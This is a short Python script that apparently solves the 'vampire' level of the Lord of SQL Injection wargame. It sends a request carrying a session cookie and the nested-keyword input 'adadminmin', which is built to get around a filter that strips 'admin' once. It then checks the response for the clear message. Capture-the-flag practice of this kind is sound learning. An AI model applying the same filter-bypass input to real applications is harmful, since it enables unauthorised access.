import requests
headers= {'Cookie':'PHPSESSID=iot1jl8tr5l94b3la52t54ps8k'}
url = "https://los.rubiya.kr/chall/vampire_e3f1ef853da067db37f342f3a1881156.php?id=adadminmin"
r = requests.get(url, headers=headers).text
if "<h2>VAMPIRE Clear!</h2>" in r:
    print(r)